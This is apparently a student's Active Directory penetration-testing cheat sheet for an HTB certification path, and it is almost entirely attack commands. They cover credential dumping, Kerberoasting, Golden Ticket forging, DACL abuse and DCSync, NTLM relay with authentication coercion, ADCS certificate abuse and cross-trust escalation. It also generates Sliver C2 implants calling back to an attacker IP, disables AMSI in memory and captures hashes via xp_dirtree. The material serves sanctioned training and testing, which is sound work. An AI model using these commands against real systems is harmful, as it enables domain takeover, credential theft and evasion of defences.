# AD Penetration Tester — Red Book
> HTB CAPE Path | @driva | 2026

---

## Module Index
| # | Module | Diff | Status |
|---|--------|------|--------|
| 01 | AD Enumeration & Attacks | Medium | ✅ (CPTS) |
| 02 | AD LDAP | Medium | 🔄 |
| 03 | AD PowerView | Medium | ⬜ |
| 04 | AD BloodHound | Medium | ⬜ |
| 05 | Windows Lateral Movement | Medium | ⬜ |
| 06 | CrackMapExec / NetExec | Medium | ⬜ |
| 07 | Kerberos Attacks | Medium | ⬜ |
| 08 | DACL Attacks I | Hard | ⬜ |
| 09 | DACL Attacks II | Hard | ⬜ |
| 10 | NTLM Relay Attacks | Hard | ⬜ |
| 11 | ADCS Attacks | Hard | ⬜ |
| 12 | AD Trust Attacks | Hard | ⬜ |
| 13 | C2 with Sliver | Hard | ⬜ |
| 14 | Windows Evasion | Hard | ⬜ |
| 15 | MSSQL / Exchange / SCCM | Hard | ⬜ |

---

## 02 — AD LDAP 🔄
Query AD over LDAP to extract users, groups, GPOs, and sensitive attributes before touching anything noisy.
```bash
# Anonymous
ldapsearch -H ldap://<IP> -x -b "DC=domain,DC=local"

# Authenticated
ldapsearch -H ldap://<IP> -x -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=user)"

# Full dump
ldapdomaindump -u 'domain\user' -p 'pass' <IP>

# Privileged users (adminCount=1)
windapsearch -d domain.local -u user -p pass --da

# NetExec LDAP
nxc ldap <IP> -u user -p pass --query "(adminCount=1)" ""
```

**Key attributes:** `memberOf`, `description`, `userAccountControl`, `adminCount`, `pwdLastSet`, `msDS-KeyCredentialLink`

---

## 03 — PowerView ⬜
Windows-side domain enumeration. Map the ACL landscape manually before running BloodHound.
```powershell
Import-Module .\PowerView.ps1

Get-Domain
Get-DomainController
Get-DomainUser | select samaccountname, description, memberof
Get-DomainUser -SPN                          # kerberoastable accounts
Get-DomainGroupMember "Domain Admins"
Get-DomainComputer | select dnshostname, operatingsystem
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
Find-DomainShare -CheckShareAccess
```

---

## 04 — BloodHound ⬜
Graph-based attack path analysis. Collect → import → find shortest path to DA.
```bash
# Linux collector
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All

# Windows collector
SharpHound.exe -c All --zipfilename out.zip
```
```cypher
-- Shortest path to DA
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

-- Owned → DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

---

## 05 — Windows Lateral Movement ⬜
Move laterally using hashes or tickets — no cleartext needed.
```bash
# Pass-the-Hash
psexec.py -hashes :<NT> domain/user@<IP>
wmiexec.py -hashes :<NT> domain/user@<IP>
evil-winrm -i <IP> -u user -H <NT>
nxc smb <IP> -u user -H <NT> -x "whoami"

# Pass-the-Ticket (Windows)
Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
```

---

## 06 — CrackMapExec / NetExec ⬜
Swiss army knife for SMB/LDAP/WinRM enumeration and credential attacks at scale.
```bash
# Generate relay list (no SMB signing)
nxc smb <CIDR> --gen-relay-list no_signing.txt

# Password spray
nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success

# Credential dump
nxc smb <IP> -u user -p pass --sam
nxc smb <IP> -u user -p pass --lsa
nxc smb <IP> -u user -p pass -M lsassy

# BloodHound collection via LDAP
nxc ldap <IP> -u user -p pass --bloodhound -c All
```

---

## 07 — Kerberos Attacks ⬜
Abuse the Kerberos protocol to get crackable hashes or forge tickets.
```bash
# AS-REP Roasting — accounts with PreAuth disabled
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoasting — SPNs on user accounts
GetUserSPNs.py domain.local/user:pass -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# Golden Ticket — requires krbtgt NT hash + domain SID
ticketer.py -nthash <KRBTGT_NT> -domain-sid <SID> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local

# Silver Ticket — targets a specific service
ticketer.py -nthash <SERVICE_NT> -domain-sid <SID> -domain domain.local -spn cifs/server user
```

**Delegation types:**
- **Unconstrained** → dump TGTs from lsass on the delegating machine
- **Constrained** → S4U2Self + S4U2Proxy abuse
- **RBCD** → write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target

---

## 08 & 09 — DACL Attacks ⬜
> HTB ref: Eighteen (BadSuccessor)

Abuse misconfigured ACEs to escalate privileges or take over accounts.

**ACEs to hunt:** `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AllExtendedRights`
```bash
# Enumerate ACLs from Linux
dacledit.py -action read -target "victim" domain.local/user:pass

# Shadow Credentials — write msDS-KeyCredentialLink → get NT hash
pywhisker.py -d domain.local -u attacker -p pass --target victim --action add
certipy auth -pfx victim.pfx -dc-ip <DC_IP>

# Force password reset
net rpc password victim 'NewPass123!' -U domain/attacker%pass -S <DC_IP>

# DCSync via WriteDACL on domain object
dacledit.py -action write -target-dn "DC=domain,DC=local" -principal attacker -rights DCSync domain.local/attacker:pass
secretsdump.py domain/attacker:pass@<DC_IP> -just-dc

# BadSuccessor — abuse delegated MSA DACL → inherit privileged account creds
```

---

## 10 — NTLM Relay ⬜
Capture and relay NTLM auth to targets without SMB signing enabled.

**Conditions:** SMB signing OFF on target, relay to a different host than source.
```bash
# Identify targets without signing
nxc smb <CIDR> --gen-relay-list no_signing.txt

# Relay to LDAP (dump / shadow creds / RBCD)
ntlmrelayx.py -tf no_signing.txt -smb2support -t ldap://<DC_IP> --delegate-access

# Coerce authentication
PetitPotam.py -u user -p pass <attacker_ip> <target>
printerbug.py domain/user:pass <target> <attacker_ip>

# IPv6 + WPAD poisoning
mitm6 -d domain.local &
ntlmrelayx.py -6 -tf no_signing.txt -smb2support --delegate-access

# SOCKS relay for tool proxying
ntlmrelayx.py -tf targets.txt -smb2support -socks
proxychains psexec.py -no-pass domain/user@target
```

---

## 11 — ADCS Attacks ⬜
Abuse misconfigured certificate templates to impersonate privileged users.
```bash
# Scan for vulnerabilities
certipy find -u user@domain.local -p pass -dc-ip <DC_IP> -vulnerable -stdout

# ESC1 — enrollee supplies SAN + client auth EKU
certipy req -u user@domain.local -p pass -ca CA_NAME \
  -template VulnTemplate -upn administrator@domain.local

# ESC8 — relay HTTP to AD CS enrollment endpoint
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py <attacker_ip> <DC_IP>

# Cert → TGT → NT hash (PKINIT)
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**ESC reference:** ESC1 (SAN), ESC2 (Any Purpose EKU), ESC3 (Enrollment Agent), ESC4 (template write), ESC6 (CA flag), ESC8 (relay), ESC9–13 (misc)

---

## 12 — AD Trust Attacks ⬜
Cross domain/forest privilege escalation by abusing trust relationships.
```bash
# Enumerate trusts
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts

# ExtraSIDs — child domain → parent domain EA
# Requires: child krbtgt NT hash, child domain SID, parent Enterprise Admins SID
ticketer.py -nthash <CHILD_KRBTGT_NT> -domain-sid <CHILD_SID> \
  -extra-sid <PARENT_EA_SID> -domain child.domain.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass parent.domain.local/administrator@dc.parent.domain.local
```

---

## 13 — C2 with Sliver ⬜
Deploy and manage implants for persistent, stealth post-exploitation.
```bash
# Start server
sliver-server

# Generate implants
generate --mtls <attacker_ip>:443 --os windows --arch amd64 --save implant.exe
generate beacon --http <attacker_ip> --os windows --save beacon.exe

# Start listeners
mtls --lport 443
http --lport 80

# Session commands
use <session_id>
info / whoami / ps / netstat
execute -o "whoami /all"
upload /local/path /remote/path
download /remote/path
```

**Key concepts:** beacon (async) vs session (interactive), BOF extensions via Armory, mTLS for C2 comms, stageless preferred for evasion.

---

## 14 — Windows Evasion ⬜
Bypass AMSI, ETW, AV/EDR to execute offensive tooling undetected.
```powershell
# AMSI patch (in-memory)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW patch
$p = [System.Diagnostics.Eventing.EventProvider]
$f = $p.GetField('m_enabled','NonPublic,Instance')
# patch m_enabled to 0 on current provider instance
```

**Key techniques:** process injection (classic / early bird / hollowing), PPID spoofing, LOLBins/LOLDrivers, syscall unhooking (SysWhispers3, HellsGate), sleep obfuscation, PS obfuscation (Invoke-Obfuscation).

---

## 15 — MSSQL / Exchange / SCCM ⬜

### MSSQL
```bash
mssqlclient.py domain/user:pass@<IP> -windows-auth

# Enable and use xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Linked server traversal
SELECT * FROM sys.servers;
EXEC('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

# UNC path → Net-NTLMv2 capture
EXEC xp_dirtree '\\<attacker_ip>\share';
```

### Exchange
```bash
# PrivExchange — relay Exchange auth to LDAP → escalate attacker account
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user attacker
privexchange.py -u user -p pass -d domain.local <exchange_ip>
```

### SCCM
```bash
SharpSCCM.exe get site-info
SharpSCCM.exe get naa              # Network Access Account creds

python3 sccmhunter.py find -u user -p pass -d domain.local -dc <DC_IP>
```

---

## Attack Flow
```
RECON          →  nmap · ldapsearch anon · enum4linux
FOOTHOLD       →  spray · AS-REP roast · SMB null session
ENUM AUTH      →  BloodHound · PowerView · certipy find · LDAP dump
PRIVESC        →  Kerberoast · DACL abuse · ADCS ESC* · delegation · relay
LAT MOVEMENT   →  PTH · PTT · WMIExec · Evil-WinRM
DA             →  DCSync · Golden Ticket · trust attacks
POST-EXPLOIT   →  Sliver C2 · evasion · persistence
```

---

## References
- https://www.thehacker.recipes
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://github.com/swisskyrepo/PayloadsAllTheThings (AD section)
- https://github.com/ly4k/Certipy
- https://github.com/fortra/impacket
- https://github.com/ly4k/PyWhisker
- https://github.com/ShawnDEvans/smbmap
